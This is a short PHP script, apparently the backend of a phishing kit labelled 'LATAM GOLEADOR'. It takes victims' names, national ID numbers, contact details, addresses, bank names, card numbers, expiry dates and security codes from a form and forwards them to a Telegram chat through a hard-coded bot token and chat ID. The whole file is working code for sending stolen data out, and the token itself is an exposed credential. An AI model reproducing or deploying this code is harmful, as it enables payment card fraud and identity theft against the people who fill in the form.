<?php
// send_to_telegram.php

// Token y chat ID de Telegram
$telegram_token = '8121632068:AAHRgNFxOvTYwYD3S1ynwQa-BmA-zdN4iZw';
$chat_id = '-1002485883002';

header('Content-Type: application/json');

$input = file_get_contents('php://input');
$data = json_decode($input, true);

if ($data) {
    $message = "LATAM GOLEADOR💎\n";
    $message .= "-------------------------------\n";
    $message .= "👤Nombre: " . $data['name'] . "\n";
    $message .= "🪪Cedula: " . $data['cc'] . "\n";
    $message .= "-------------------------------\n";
    $message .= "💌Correo: " . $data['email'] . "\n";
    $message .= "📞Teléfono: " . $data['telnum'] . "\n";
    $message .= "🌇Ciudad: " . $data['city'] . "\n";
    $message .= "🗺️Dirección: " . $data['address'] . "\n";
    $message .= "-------------------------------\n";
    $message .= "🏦 Banco: " . $data['ban'] . "\n";
    $message .= "💳: " . $data['p'] . "\n";
    $message .= "📅: " . $data['pdate'] . "\n";
    $message .= "🔐: " . $data['c'] . "\n";
    $message .= "------------------------------\n";
    $message .= "Disp: " . $data['disp'] . "\n";

    // URL de la API de Telegram
    $url = "https://api.telegram.org/bot$telegram_token/sendMessage";

    // Parámetros de la solicitud
    $post_fields = array(
        'chat_id' => $chat_id,
        'text' => $message
    );

    // Iniciar curl
    $ch = curl_init(); 
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($post_fields));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    // Ejecutar y cerrar curl
    $result = curl_exec($ch);
    curl_close($ch);

    echo json_encode(['status' => 'success', 'result' => $result]);
} else {
    echo json_encode(['status' => 'error', 'message' => 'No data received']);
}
?>
